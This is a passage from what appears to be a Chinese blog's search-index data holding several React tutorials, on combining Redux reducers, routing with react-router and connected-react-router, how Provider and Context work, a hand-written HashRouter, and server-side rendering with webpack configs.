合并reducers\n假如我们的项目里面，有两个计数器，而且它俩是完全没有关系的，状态也是完全独立的，这个时候就需要用到合并reducers了\n\n\n首先我们新增action的动作行为类型，在./src/store/action-types.tsx\n然后修改接口文件，./src/types/index.tsx\n然后把./src/store/actions/counter.tsx文件拷贝在当前目录并且修改名称为counter2.tsx\n然后把./src/store/reduces/index.tsx拷贝并且改名为counter.tsx和counter2.tsx\n\n\n我们多个reducer是通过combineReducers方法，进行合并的，因为我们一个项目当中肯定是存在非常多个reducer，所以统一在这里处理。\n\n// ./src/store/reducers/index.tsc// 引入合并方法import &#123; combineReducers &#125; from &quot;redux&quot;;// 引入需要合并的reducerimport counter from &quot;./counter&quot;;// 引入需要合并的reducerimport counter2 from &quot;./counter2&quot;;// 合并let reducers = combineReducers(&#123;  counter,  counter2,&#125;);export default reducers;\n\n\n最后修改组件，进入./src/components/,其中\n\n到目前为止，我们完成了reducers的合并了，那么我们看看效果如何，首先我们给./src/index.tsc添加Counter2组件，这样的目的是与Counter组件完全独立，互不影响，但是又能够最终合并到readucers\n\n2.3 路由2.3.1 基本用法\n首先进入./src/index.tsx导入我们的路由所需要的依赖包\n\n// ./src/index.tsximport * as React from &quot;react&quot;;import * as ReactDom from &quot;react-dom&quot;;// 引入redux这个库的Provider组件import &#123; Provider &#125; from &quot;react-redux&quot;;// 引入路由// 路由的容器:HashRouter as Router// 路由的规格:Route// Link组件import &#123; BrowserRouter as Router,Route,Link &#125; from &quot;react-router-dom&quot;// 引入仓库import store from &#x27;./store&#x27;import CounterComponent from &quot;./components/Counter&quot;;import CounterComponent2 from &quot;./components/Counter2&quot;;import Counter from &quot;./components/Counter&quot;;function Home() &#123;    return &lt;div&gt;home&lt;/div&gt;&#125;// 用Provider包裹CounterComponent组件// 并且把store传给Provider// 这样Provider可以向它的子组件提供storeReactDom.render((  &lt;Provider store=&#123;store&#125;&gt;    &#123;/* 路由组件 */&#125;    &lt;Router&gt;      &#123;/*  放两个路由规则需要在外层套个React.Fragment */&#125;        &lt;React.Fragment&gt;            &#123;/* 增加导航 */&#125;            &lt;ul&gt;            &lt;li&gt;&lt;Link to=&quot;/&quot;&gt;Home&lt;/Link&gt;&lt;/li&gt;            &lt;li&gt;&lt;Link to=&quot;/counter&quot;&gt;Counter&lt;/Link&gt;&lt;/li&gt;            &lt;li&gt;&lt;Link to=&quot;/counter2&quot;&gt;Counter2&lt;/Link&gt;&lt;/li&gt;            &lt;/ul&gt;            &#123;/* 当路径为 / 时是home组件 */&#125;            &#123;/* 为了避免home组件一直渲染，我们可以添加属性exact */&#125;            &lt;Route exact path=&quot;/&quot; component=&#123;Home&#125;/&gt;            &lt;Route path=&quot;/counter&quot; component=&#123;CounterComponent&#125;/&gt;            &lt;Route path=&quot;/counter2&quot; component=&#123;CounterComponent2&#125; /&gt;        &lt;/React.Fragment&gt;        &lt;/Router&gt;  &lt;/Provider&gt;),document.getElementById(&quot;app&quot;))\n\n\n\n但是有个很大的问题，就是我们直接访问http://localhost:8080/counter会找不到路由\n\n\n因为我们的是单页面应用，不管路由怎么变更，实际上都是访问index.html这个文件，所以当我们访问根路径的时候，能够正常访问，因为index.html文件就放在这个目录下，但是当我们通过非根路径的路由访问，则出错了，是因为我们在相应的路径没有这个文件，所以出错了\n从这一点也可以衍生出一个实战经验，我们平时项目部署上线的时候，会出现这个问题，一般我们都是用nginx来把访问的路径都是指向index.html文件，这样就能够正常访问了。\n那么针对目前我们这个情况，我们可以通过修改webpack配置，让路由不管怎么访问，都是指向我们制定的index.html文件。\n\n\n进入./webpack.config.js，在devServer的配置对象下新增一些配置\n\n// ./webpack.config.js...  // 开发环境服务配置  devServer:&#123;    // 启动热更新,当模块、组件有变化，不会刷新整个页面，而是局部刷新    // 需要和插件webpack.HotModuleReplacementPlugin配合使用    hot:true,     // 静态资源目录    contentBase:path.resolve(__dirname,&#x27;dist&#x27;),    // 不管访问什么路径，都重定向到index.html    historyApiFallback:&#123;      index:&quot;./index.html&quot;    &#125;  &#125;...\n\n\n修改webpack配置需要重启服务，然后重启服务，看看浏览器能否正常访问http://localhost:8080/counter\n\n2.3.2 同步路由到redux\n路由的路径，如何同步到仓库当中。以前是用一个叫react-router-redux的库，把路由和redux结合到一起的，react-router-redux挺好用的，但是这个库不再维护了，被废弃了，所以现在推荐使用connected-react-router这个库，可以把路由状态映射到仓库当中\n\n\n首先我们在./src下创建文件history.tsx\n\n假设我有一个需求，就是我不通过Link跳转页面，而是通过编程式导航，触发一个动作，然后这个动作会派发出去，而且把路由信息放到redux中，供我以后查看。\n\n我们进入./src/store/reducers/index.tsx\n\n// 引入合并方法import &#123; combineReducers &#125; from &quot;redux&quot;;// 引入需要合并的reducerimport counter from &quot;./counter&quot;;// 引入需要合并的reducerimport counter2 from &quot;./counter2&quot;;// 引入connectRouterimport &#123; connectRouter &#125; from &quot;connected-react-router&quot;;import history from &quot;../../history&quot;;// 合并let reducers = combineReducers(&#123;  counter,  counter2,  // 把history传到connectRouter函数中  router: connectRouter(history)&#125;);export default reducers;\n\n\n我们进入./src/store/index.tsx来添加中间件\n\n// 需要使用到thunk，所以引入中间件applyMiddlewareimport &#123; createStore, applyMiddleware &#125; from &quot;redux&quot;;// 引入reducersimport reducers from &quot;./reducers&quot;;// 引入redux-thunk，处理异步// 现在主流处理异步的是saga和thunkimport thunk from &quot;redux-thunk&quot;;// 引入日志import logger from &quot;redux-logger&quot;;// 引入中间件import &#123; routerMiddleware &#125; from &quot;connected-react-router&quot;;import history from &quot;../history&quot;;// 接着创建仓库和中间件let store = createStore(reducers, applyMiddleware(routerMiddleware(history),thunk,logger));// 导出store仓库export default store;\n\n\n我们进入./src/store/actions/counter.tsx加个goto方法用来跳转\n\n// ./src/store/actions/counter.tsximport * as types from &quot;../action-types&quot;;// 引入push方法import &#123; push &#125; from &quot;connected-react-router&quot;;// 定义两个接口，分别约束add和subtract的type类型export interface Add&#123;  type:typeof types.ADD&#125;export interface Subtract&#123;  type:typeof types.SUBTRACT&#125;// 再导出一个type// type是用来给类型起别名的// 这个actions里是一个对象，会有很多函数，每个函数都会返回一个action// 而 ./store/reducers/index.tsx中的action会是下面某一个函数的返回值export type Action = Add | Subtract// 把上面定义好的接口作用于下面// 约束返回值的类型export default &#123;  add():Add&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.ADD&#125;  &#125;,  subtract():Subtract&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.SUBTRACT&#125;  &#125;,  // 一秒后才执行这个行为  addAsync():any&#123;    return function (dispatch:any,getState:any) &#123;      setTimeout(function()&#123;        // 当1秒过后，会执行dispatch，派发出去，然后改变仓库的状态        dispatch(&#123;type:types.ADD&#125;)      &#125;, 1000);    &#125;  &#125;,  goto(path:string)&#123;    // 派发一个动作    // 这个push是connected-react-router里的一个方法    // 返回一个跳转路径的action    return push(path)  &#125;&#125;\n\n\n我们进入./src/components/Counter.tsx中加个按钮，当我点击按钮的时候，会向仓库派发action，仓库的action里有中间件，会把我们这个请求拦截到，然后跳转\n\n","categories":["框架"],"tags":["React"]},{"title":"React-Redux原理","url":"/2020/02/21/React/React-Redux%E5%8E%9F%E7%90%86/","content":"（一）Redux 特点Redux顾名思义（Reducer+Flux）\n1.唯一数据源唯一数据源指的是应用的状态数据应该只存储在唯一的一个 Store 上 。我们已经知道，在 Flux 中，应用可以拥有多个 Store ，往往根据功能把应用的状态数据划分给若干个 Store 分别存储管理 。\n如果状态数据分散在多个 Store 中，容易造成数据冗余，这样数据一致性方面就会出问题 。 虽然利用 Dispatcher 的 waitFor 方法可以保证多个 Store 之间的更新顺序，但是这又产生了不同 Store 之间的显示依赖关系，这种依赖关系的存在增加了应用的复杂度，容易带来新的问题。\n2.保持状态只读保持状态只读，就是说不能去直接修改状态，要修改 Store 的状态，必须要通过派发一个 action 对象完成，这一点 ，和 Flux 的要求并没有什么区别 。\n3.数据改变只能通过纯函数完成Reducer 不是一个 Redux 特定的术语，就以 JavaScript 为例，在ES5的数组高阶API\nreduce最后一个为默认参数, 如果不设置就将数组第一个为默认值。\n在 Redux 中， 每个 reducer 的函数签名如下所示 ：\nreducer(state , action)\n\n\n\n第一个参数 state 是当前的状态，第二个参数 action 是接收到的 action 对象，而 reducer函数要做的事情，就是根据 state 和 action 的值产生一个新的对象返回，注意 reducer 必须是纯函数，也就是说函数的返回结果必须完全由参数 state 和 action 决定，而且不产生任何副作用，也不能修改参数 state 和 action 对象。\n比对Flux和Redux处理Store的差别\nCounterStore.dispatchToken = AppDispatcher.register((action ) =&gt; &#123;  if (action.type === ActionTypes .INCREMENT) &#123;        counterValues[action.counterCaption) ++;        CounterStore.emitChange() ;   &#125; else if (action.type === ActionTypes.DECREMENT) &#123;        counterValues[action.counterCaption]        CounterStore.emitChange() ;   &#125;&#125;);\n\n\n\nFlux 更新状态的函数只有一个参数 action ，因为状态是由 Store 直接管理的，所以处理函数中会看到代码直接更新 state ；\n在 Redux 中，一个实现同样功能的 reducer 代码如下：\nfunction reducer(state , action) =&gt; &#123;    const &#123;counterCaption&#125; = action;    switch (action.type) &#123;        case ActionTypes.INCREMENT :            return &#123;... state , [counterCaption] : state [counterCaption ] + 1&#125;;        case ActionTypes.DECREMENT:            return &#123;... state, [counterCaption] : state [counterCaption) - 1&#125;;    default :        return state    &#125;&#125;\n\n\n\n可以看到 reducer 函数不光接受 action 为参数，还接受 state 为参数。也就是说， Redux的 reducer 只负责计算状态，却并不负责存储状态 。\n（二）组件 Context相关代码已经推送到\n我的github的simple-provider分支\nreact-redux 顶层封装了一个Provider组件。现在我们来看下他的内部实现原理。\n（1）为什么需要contextRedux的基本慨念\n这里再次提及下Redux的Store上的3个api，\n   store.getState()  // 获得 store 上存储的所有状态   store.dispatch() // View 发出 Action 的唯一方法   store.subscribe() // 订阅 store上State 发生变化\n\n\n\n虽然 Redux 应用全局就一个 Store 这样的直接导入依然有问题，因为在组件中直接导人 Store 是非常不利于组件复用的 。\n所以，一个应用中，最好只有一个地方需要直接导人 Store ，这个位置当然应该是在调用最顶层 React 组件的位置 。 但是这样需要把Store，从顶层一层层往下传递，首先我们想到的就是props（父子组件通信方案）。这种方法有一个很大的缺陷，就是从上到下，所有的组件都要帮助传递这个 props 。\n设想在一个嵌套多层的组件结构中，只有最里层的组件才需要使用 store ，但是为了把 store 从最外层传递到最里层，就要求中间所有的组件都需要增加对这个 store prop 的支持，即使根本不使用它，这无疑增加程序的耦合度，复杂度和不可维护性 。\nReact 提供了一个 叫 Context 的功能，能够完美地解决这个问题 。\n（2）Context 基本慨念所谓 Context ，就是“上下文环境”，让一个树状组件上所有组件都能访问一个共同的对象，为了完成这个任务，需要上级组件和下级组件配合 。\n首先，上级组件要宣称自己支持 context，并且提供一个函数来返回代表 Context 的对象。\n然后，这个上级组件之下的所有子孙组件，只要宣称自己需要这个 context ，就可以通过 this.context 访问到这个共同的环境对象。\n（3）Context 组件实现这里为了演示，顶层容器为ControlPanel，一般我们会将起作为容器组件，将Summary和Counter设置为傻瓜组件。为了演示context可以不通过props传递，分别为Summary，Counter增加外层容器。\n首先是增加Provider 组件\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import PropTypes from &#x27;prop-types&#x27;;class Provider extends Component &#123;  getChildContext() &#123;    return &#123;      store: this.props.store    &#125;;  &#125;  render() &#123;    return this.props.children;  &#125;&#125;Provider.propTypes = &#123;  store: PropTypes.object.isRequired&#125;// 指定 Provider 的 childContextTypes 属性Provider.childContextTypes = &#123;  store: PropTypes.object&#125;;export default Provider;\n\n\n\n我们创建了一个通用的 context 提供者 Provider 组件。注意一下几点： \n\n提供－个函数 getChildContext ，这个函数返回的就是代表 Context 的对象 。 \n通过 this.props.children 渲染子组件 \n指定 Provider 的childContextTypes 属性，让其能被React 认可为一个 Context 的提供者。 \n定义类 的 childContextTypes ，必须和 getChildContext 对应，只有这两者都齐备， Provider 的子组件才有可能访问到 context。\n\n然后修改应用的入口 src&#x2F;index.js\nimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import &#x27;./index.css&#x27;;import registerServiceWorker from &#x27;./config/registerServiceWorker&#x27;;import &#123;Provider&#125; from &#x27;./components/Common&#x27;import ControlPanel from &#x27;./views/SimpleProvider&#x27;import StoreConfig  from &#x27;./store&#x27;;const store = StoreConfig();ReactDOM.render(    &lt;Provider store=&#123;store&#125;&gt;      &lt;ControlPanel /&gt;    &lt;/Provider&gt;,    document.getElementById(&#x27;root&#x27;));registerServiceWorker();\n\n\n\n上面代码， Provider 成为了顶层组件 。 当然，如同我们上面看到 的， Provider 只是把渲染工作完全交给子组件，它扮演的角色只是提供Context ，包住了最顶层 的 ControlPanel ，也就让 context 覆盖了整个应用中所有组件 。\n然后为Counter.js 增加容器组件\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import PropTypes from &#x27;prop-types&#x27;;import * as Actions from &#x27;../../actions/demoActions&#x27;;const buttonStyle = &#123;  margin: &#x27;10px&#x27;&#125;;//presentational componentconst Counter = (&#123;caption, onIncrement, onDecrement, value&#125;) =&gt; &#123;  return (    &lt;div&gt;      &lt;button style=&#123;buttonStyle&#125; onClick=&#123;onIncrement&#125;&gt;+&lt;/button&gt;      &lt;button style=&#123;buttonStyle&#125; onClick=&#123;onDecrement&#125;&gt;-&lt;/button&gt;      &lt;span&gt;&#123;caption&#125; count: &#123;value&#125;&lt;/span&gt;    &lt;/div&gt;  );&#125;Counter.propTypes = &#123;  caption: PropTypes.string.isRequired,  onIncrement: PropTypes.func.isRequired,  onDecrement: PropTypes.func.isRequired,  value: PropTypes.number.isRequired&#125;;// Counter 容器class CounterContainer extends Component &#123;  constructor (props, context) &#123;    super(props, context);    this.state = this.getOwnState();  &#125;  // 箭头函数, 不用在构造器bind this  getOwnState = () =&gt; &#123;    const &#123; demo &#125; = this.context.store.getState();    const &#123; caption &#125; = this.props;    return &#123;      value: demo[caption]    &#125;  &#125;  onIncrement = () =&gt; &#123;    const &#123; caption &#125; = this.props;    this.context.store.dispatch(Actions.increment(caption));  &#125;  onDecrement = () =&gt; &#123;    const &#123; caption &#125; = this.props;    this.context.store.dispatch(Actions.decrement(caption));  &#125;  onChange = () =&gt; &#123;    this.setState(this.getOwnState());  &#125;  shouldComponentUpdate(nextProps, nextState) &#123;    return (nextProps.caption !== this.props.caption) ||        (nextState.value !== this.state.value);  &#125;  componentDidMount() &#123;    this.context.store.subscribe(this.onChange);  &#125;  componentWillUnmount() &#123;    this.context.store.unsubscribe(this.onChange);  &#125;  render() &#123;    const &#123; caption &#125; = this.props;    const onIncrement = this.onIncrement;    const onDecrement = this.onDecrement;    const &#123; value &#125; =this.state;    const counterProps = &#123; caption, value, onIncrement, onDecrement &#125;;    return &lt;Counter &#123;...counterProps&#125;/&gt;  &#125;&#125;CounterContainer.propTypes = &#123;  caption: PropTypes.string.isRequired&#125;;CounterContainer.contextTypes = &#123;  store: PropTypes.object&#125;export default CounterContainer;\n\n\n\n最后为Summary.js 增加容器组件\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import PropTypes from &#x27;prop-types&#x27;;const Summary = (&#123;sum&#125;) =&gt; &#123;  return (    &lt;div&gt;Total Count: &#123;sum&#125;&lt;/div&gt;  );&#125;Summary.propTypes = &#123;  sum: PropTypes.number.isRequired&#125;;class SummaryContainer extends Component &#123;  constructor(props, context) &#123;    super(props, context);    this.state = this.getOwnState();  &#125;  onChange = () =&gt; &#123;    this.setState(this.getOwnState());  &#125;  getOwnState = () =&gt; &#123;    const &#123; demo &#125; = this.context.store.getState();    let sum = 0;    for (const key in demo) &#123;      if (demo.hasOwnProperty(key)) &#123;        sum += demo[key];      &#125;    &#125;return &#123; sum: sum &#125;;  &#125;  shouldComponentUpdate(nextProps, nextState) &#123;    return nextState.sum !== this.state.sum;  &#125;  componentDidMount() &#123;    this.context.store.subscribe(this.onChange);  &#125;  componentWillUnmount() &#123;    this.context.store.unsubscribe(this.onChange);  &#125;  render() &#123;    const sum = this.state.sum;    return (        &lt;Summary sum=&#123;sum&#125; /&gt;    );  &#125;&#125;SummaryContainer.contextTypes = &#123;  store: PropTypes.object&#125;export default SummaryContainer\n\n\n\n总结：上面代码中，我们可以发现一下几点问题：\n在调用 super 的时候，一定要带上 context 参数，这样才能让 React 组件初始化实例中的 context ，不然组件的其他部分就无法使用 this.context。必须给 CounterContainer和 SummaryContainer 类的 contextTypes 赋值和 Provider. childContextTypes 一样的值，两者必须一致，不然就无法访问到context我们为CounterContainer和 SummaryContainer 类重复的获取state，重复的订阅store，绑定生命周期，完全需要抽离出来，而且这种是不兼容React-Router的写法总结一下：\nContext 这个功能相当于提供了一个全局可以访问的对象但是全局对象或者说全局变量肯定是我们应该避免的用法，只要有一个地方改变了全局对象的值，应用中其他部分就会受影响，那样整个程序的运行结果就完全不可预期了 。\n所以，单纯来看 React 的这个 Context 功能的话，必须强调这个功能要谨慎使用，只有对那些每个组件都可能使用，但是中间组件又可能不使用的对象才有必要使用Context ，千万不要滥用 。\n但是，对于 Redux ，因为 Redux 的 Store 封装得很好，没有提供直接修改状态的功能，就是说一个组件虽然能够访问全局唯一的 Store ，却不可能直接修改 Store 中的状态，这样部分克服了作为全局对象的缺点 。\n而且，一个应用只有一个 Store ，这个 Store 是 Context里唯一需要的东西，并不算滥用，所以，使用 Context 来传递 Store 是一个不错的选择 。\n","categories":["框架"],"tags":["React"]},{"title":"React-Router原理","url":"/2020/03/02/React/React-Router%E5%8E%9F%E7%90%86/","content":"一、是什么在单页应用中，一个web项目只有一个html页面，一旦页面加载完成之后，就不用因为用户的操作而进行页面的重新加载或者跳转，其特性如下：\n\n改变 url 且不让浏览器像服务器发送请求\n在不刷新页面的前提下动态改变浏览器地址栏中的URL地址\n\n其中主要分成了两种模式：\n\nhash 模式：在url后面加上#，如http://127.0.0.1:5500/home/#/page1\nhistory 模式：允许操作浏览器的曾经在标签页或者框架里访问的会话历史记录\n\n二、使用React Router对应的hash模式和history模式对应的组件为：\n\nHashRouter\nBrowserRouter\n\n这两个组件的使用都十分的简单，作为最顶层组件包裹其他组件，如下所示\n// 1.import &#123; BrowserRouter as Router &#125; from &quot;react-router-dom&quot;;// 2.import &#123; HashRouter as Router &#125; from &quot;react-router-dom&quot;;import React from &#x27;react&#x27;;import &#123;  BrowserRouter as Router,  // HashRouter as Router    Switch,  Route,&#125; from &quot;react-router-dom&quot;;import Home from &#x27;./pages/Home&#x27;;import Login from &#x27;./pages/Login&#x27;;import Backend from &#x27;./pages/Backend&#x27;;import Admin from &#x27;./pages/Admin&#x27;;function App() &#123;  return (    &lt;Router&gt;        &lt;Route path=&quot;/login&quot; component=&#123;Login&#125;/&gt;        &lt;Route path=&quot;/backend&quot; component=&#123;Backend&#125;/&gt;        &lt;Route path=&quot;/admin&quot; component=&#123;Admin&#125;/&gt;        &lt;Route path=&quot;/&quot; component=&#123;Home&#125;/&gt;    &lt;/Router&gt;  );&#125;export default App;\n\n三、实现原理路由描述了 URL 与 UI之间的映射关系，这种映射是单向的，即 URL 变化引起 UI 更新（无需刷新页面）\n下面以hash模式为例子，改变hash值并不会导致浏览器向服务器发送请求，浏览器不发出请求，也就不会刷新页面\nhash 值改变，触发全局 window 对象上的 hashchange 事件。所以 hash 模式路由就是利用 hashchange 事件监听 URL 的变化，从而进行 DOM 操作来模拟页面跳转\nreact-router也是基于这个特性实现路由的跳转\n下面以HashRouter组件分析进行展开：\nHashRouterHashRouter包裹了整应用，\n通过window.addEventListener(&#39;hashChange&#39;,callback)监听hash值的变化，并传递给其嵌套的组件\n然后通过context将location数据往后代组件传递，如下：\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; Provider &#125; from &#x27;./context&#x27;// 该组件下Api提供给子组件使用class HashRouter extends Component &#123;  constructor() &#123;    super()    this.state = &#123;      location: &#123;        pathname: window.location.hash.slice(1) || &#x27;/&#x27;      &#125;    &#125;  &#125;  // url路径变化 改变location  componentDidMount() &#123;    window.location.hash = window.location.hash || &#x27;/&#x27;    window.addEventListener(&#x27;hashchange&#x27;, () =&gt; &#123;      this.setState(&#123;        location: &#123;          ...this.state.location,          pathname: window.location.hash.slice(1) || &#x27;/&#x27;        &#125;      &#125;, () =&gt; console.log(this.state.location))    &#125;)  &#125;  render() &#123;    let value = &#123;      location: this.state.location    &#125;    return (      &lt;Provider value=&#123;value&#125;&gt;        &#123;          this.props.children        &#125;      &lt;/Provider&gt;    );  &#125;&#125;export default HashRouter;\n\nRouterRouter组件主要做的是通过BrowserRouter传过来的当前值，通过props传进来的path与context传进来的pathname进行匹配，然后决定是否执行渲染组件\nimport React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; Consumer &#125; from &#x27;./context&#x27;const &#123; pathToRegexp &#125; = require(&quot;path-to-regexp&quot;);class Route extends Component &#123;  render() &#123;    return (      &lt;Consumer&gt;        &#123;          state =&gt; &#123;            console.log(state)            let &#123;path, component: Component&#125; = this.props            let pathname = state.location.pathname            let reg = pathToRegexp(path, [], &#123;end: false&#125;)            // 判断当前path是否包含pathname            if(pathname.match(reg)) &#123;              return &lt;Component&gt;&lt;/Component&gt;            &#125;            return null          &#125;        &#125;      &lt;/Consumer&gt;    );  &#125;&#125;export default Route;","categories":["框架"],"tags":["React"]},{"title":"React-SSR优化Next构建1","url":"/2020/03/13/React/React-SSR%E4%BC%98%E5%8C%96Next%E6%9E%84%E5%BB%BA1/","content":"一、客户端渲染与服务端渲染1.1 什么是客户端渲染\nreact在客户端执行，消耗客户端性能。客户端渲染，页面初始加载的HTML 页面中无网页展示内容，需要加载执行JavaScript 文件中的 React 代码，通过 JavaScript 渲染生成页面，同时，JavaScript 代码会完成页面交互事件的绑定，详细流程可参考下图\n\n客户端渲染流程\n浏览器发送请求–&gt;服务器返回HTML–&gt;浏览器发送bundle.js请求–&gt;服务器返回bundle.js–&gt;浏览器执行bundle.js中的react代码完成渲染\n\n1.2 什么是服务端渲染\nreact在服务端执行，消耗服务端性能。我们所说的服务端渲染，只是首次加载页面的时候，后面都是通过前端路由进行客户端渲染\n\n\n用户请求服务器，服务器上直接生成 HTML 内容并返回给浏览器。服务器端渲染来，页面的内容是由 Server端生成的。一般来说，服务器端渲染的页面交互能力有限，如果要实现复杂交互，还是要通过引入 JavaScript 文件来辅助实现\n\n服务端渲染流程\n浏览器发送请求–&gt;服务器运行React代码生成页面–&gt;服务器返回页面\n1.3 什么是同构\n一套react代码，在服务端执行一次，在客户端也执行一次。在服务端执行同构renderToString只是返回界面展示，并不能绑定事件，需要在客户端再次执行js代码绑定事件\n\n服务器运行React代码渲染出HTML–&gt;发送HTML给浏览器–&gt;浏览器接收到内容展示–&gt;浏览器加载js文件–&gt;Js中的React代码在浏览器端重新执行–&gt;JS中的React代码接管页面操作\n路由同构\n\n让路由在服务端、客户端各跑一遍\n\n1.4 使用SSR优劣势\n一般情况下，当我们使用 React 编写代码时，页面都是由客户端执行 JavaScript 逻辑动态挂 DOM生成的，也就是说这种普通的单页面应用实际上采用的是客户端渲染模式。在大多数情况下，客户端渲染完全能够满足我们的业务需求，那为什么我们还需要 SSR 这种同构技术呢\n\n\nCSR 项目的 TTFP（Time To First Page）时间比较长，参考之前的图例，在 CSR的页面渲染流程中，首先要加载 HTML 文件，之后要下载页面所需的 JavaScript 文件，然后 JavaScript 文件渲染生成页面。在这个渲染过程中至少涉及到两个 HTTP请求周期，所以会有一定的耗时，这也是为什么大家在低网速下访问普通的 React或者 Vue 应用时，初始页面会有出现白屏的原因\nCSR 项目的 SEO 能力极弱，在搜索引擎中基本上不可能有好的排名。因为目前大多数搜索引擎主要识别的内容还是 HTML，对 JavaScript 文件内容的识别都还比较弱。如果一个项目的流量入口来自于搜索引擎，这个时候你使用 CSR 进行开发，就非常不合适了\n\n\nSSR 的产生，主要就是为了解决上面所说的两个问题。在 React 中使用 SSR 技术，我们让 React 代码在服务器端先执行一次，使得用户下载的 HTML 已经包含了所有的页面展示内容，这样，页面展示的过程只需要经历一个 HTTP 请求周期，TTFP 时间得到一倍以上的缩减\n\n\n同时，由于 HTML 中已经包含了网页的所有内容，所以网页的 SEO 效果也会变的非常好。之后，我们让 React 代码在客户端再次执行，为 HTML网页中的内容添加数据及事件的绑定，页面就具备了 React 的各种交互能力\n\n\n但是，SSR 这种理念的实现，并非易事。我们来看一下在 React 中实现 SSR 技术的架构图：\n\n\n\n使用 SSR 这种技术，将使原本简单的 React 项目变得非常复杂，项目的可维护性会降低，代码问题的追溯也会变得困难\n所以，使用 SSR 在解决问题的同时，也会带来非常多的副作用，有的时候，这些副作用的伤害比起 SSR 技术带来的优势要大的多。从个人经验上来说，我一般建议大家，除非你的项目特别依赖搜索引擎流量，或者对首屏时间有特殊的要求，否则不建议使用 SSR\n\n二、SSR的实现本质SSR 之所以能够实现，本质上是因为虚拟 DOM 的存在\n\nSSR 的工程中，React 代码会在客户端和服务器端各执行一次。你可能会想，这没什么问题，都是 JavaScript 代码，既可以在浏览器上运行，又可以在 Node 环境下运行。但事实并非如此，如果你的 React代码里，存在直接操作 DOM 的代码，那么就无法实现 SSR 这种技术了，因为在 Node 环境下，是没有 DOM 这个概念存在的，所以这些代码在 Node 环境下是会报错的\n在 React 框架中引入了一个概念叫做虚拟 DOM，虚拟 DOM 是真实 DOM 的一个 JavaScript 对象映射，React 在做页面操作时，实际上不是直接操作 DOM，而是操作虚拟 DOM，也就是操作普通的 JavaScript 对象，这就使得 SSR 成为了可能。在服务器，我可以操作 JavaScript 对象，判断环境是服务器环境，我们把虚拟 DOM 映射成字符串输出；在客户端，我也可以操作 JavaScript 对象，判断环境是客户端环境，我就直接将虚拟 DOM 映射成真实 DOM，完成页面挂载\n\n三、SSR中服务器端路由和客户端路由区别\n实现 React 的 SSR 架构，我们需要让相同的 React 代码在客户端和服务器端各执行一次。大家注意，这里说的相同的 React 代码，指的是我们写的各种组件代码，所以在同构中，只有组件的代码是可以公用的，而路由这样的代码是没有办法公用的，大家思考下这是为什么呢？其实原因很简单，在服务器端需要通过请求路径，找到路由组件，而在客户端需通过浏览器中的网址，找到路由组件，是完全不同的两套机制，所以这部分代码是肯定无法公用。我们来看看在 SSR 中，前后端路由的实现代码\n\n3.1 客户端路由const App = () =&gt; &#123;  return (    &lt;Provider store=&#123;store&#125;&gt;      &lt;BrowserRouter&gt;        &lt;div&gt;          &lt;Route path=&#x27;/&#x27; component=&#123;Home&#125;&gt;  \t\t&lt;/div&gt;      &lt;/BrowserRouter&gt;    &lt;/Provider&gt;  )&#125;ReactDom.render(&lt;App/&gt;, document.querySelector(&#x27;#root&#x27;))\n\n\n客户端路由代码非常简单，大家一定很熟悉，BrowserRouter 会自动从浏览器地址中，匹配对应的路由组件显示出来\n\n3.2 服务器端路由const App = () =&gt; &#123;  return     &lt;Provider store=&#123;store&#125;&gt;      &lt;StaticRouter location=&#123;req.path&#125; context=&#123;context&#125;&gt;        &lt;div&gt;          &lt;Route path=&#x27;/&#x27; component=&#123;Home&#125;&gt;        &lt;/div&gt;      &lt;/StaticRouter&gt;    &lt;/Provider&gt;&#125;Return ReactDom.renderToString(&lt;App/&gt;)\n\n\n服务器端路由代码相对要复杂一点，需要你把 location（当前请求路径）传递给 StaticRouter 组件，这样 StaticRouter 才能根据路径分析出当前所需要的组件是谁。（PS：StaticRouter 是 React-Router针对服务器端渲染专门提供的一个路由组件。）\n\n\n通过 BrowserRouter 我们能够匹配到浏览器即将显示的路由组件，对浏览器来说，我们需要把组件转化成 DOM，所以需要我们使用 ReactDom.render 方法来进行 DOM 的挂载。而 StaticRouter 能够在服务器端匹配到将要显示的组件，对服务器端来说，我们要把组件转化成字符串，这时我们只需要调用 ReactDom 提供的 renderToString 方法，就可以得到 App 组件对应的 HTML 字符串。\n对于一个 React 应用来说，路由一般是整个程序的执行入口。在 SSR 中，服务器端的路由和客户端的路由不一样，也就意味着服务器端的入口代码和客户端的入口代码是不同的\n我们知道， React 代码是要通过 Webpack 打包之后才能运行的，实际上是源代码打包过后生成的代码。上面也说到，服务器端和客户端渲染中的代码，只有一部分一致，其余是有区别的。所以，针对代码运行环境的不同，要进行有区别的 Webpack 打包\n\n四、服务端和客户端打包配置4.1 客户端 Webpack 配置&#123;  entry: &#x27;./src/client/index.js&#x27;,  output: &#123;    filename: &#x27;index.js&#x27;,    path: path.resolve(__dirname, &#x27;public&#x27;)  &#125;,  module: &#123;    rules: [&#123;      test: /\\.js?$/,      loader: &#x27;babel-loader&#x27;    &#125;,&#123;      test: /\\.css?$/,      use: [&#x27;style-loader&#x27;, &#123;        loader: &#x27;css-loader&#x27;,        options: &#123;modules: true&#125;      &#125;]    &#125;,&#123;      test: /\\.(png|jpeg|jpg|gif|svg)?$/,      loader: &#x27;url-loader&#x27;,      options: &#123;        limit: 8000,        publicPath: &#x27;/&#x27;      &#125;    &#125;]  &#125;&#125;\n\n4.2 服务器端 Webpack 配置&#123;  target: &#x27;node&#x27;,  entry: &#x27;./src/server/index.js&#x27;,  output: &#123;    filename: &#x27;bundle.js&#x27;,    path: path.resolve(__dirname, &#x27;build&#x27;)  &#125;,  externals: [nodeExternals()],  module: &#123;    rules: [&#123;      test: /\\.js?$/,      loader: &#x27;babel-loader&#x27;    &#125;,&#123;      test: /\\.css?$/,      use: [&#x27;isomorphic-style-loader&#x27;, &#123;        loader: &#x27;css-loader&#x27;,        options: &#123;modules: true&#125;      &#125;]    &#125;,&#123;      test: /\\.(png|jpeg|jpg|gif|svg)?$/,      loader: &#x27;url-loader&#x27;,      options: &#123;        limit: 8000,        outputPath: &#x27;../public/&#x27;,        publicPath: &#x27;/&#x27;      &#125;    &#125;]  &#125;&#125;;\n\n\n在 SSR 中，服务器端渲染的代码和客户端的代码的入口路由代码是有差异的，所以在 